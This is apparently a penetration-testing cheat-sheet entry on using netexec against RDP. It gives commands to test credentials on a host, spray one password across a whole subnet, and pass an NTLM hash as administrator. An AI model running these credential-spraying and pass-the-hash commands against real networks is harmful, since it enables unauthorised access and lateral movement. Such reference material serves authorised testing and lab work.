### netexec (test RDP access before connecting)

```bash
# Test if creds work over RDP without actually connecting
netexec rdp $IP -u username -p 'password'
netexec rdp $IP -u username -p 'password' -d corp.local

# Spray across a subnet
netexec rdp 10.10.10.0/24 -u username -p 'password' -d corp.local

# Pass the Hash test
netexec rdp $IP -u administrator -H NTLMhash
```

> Use netexec to verify RDP access before connecting — confirms the credentials work and the account is in Remote Desktop Users without opening a full GUI session.

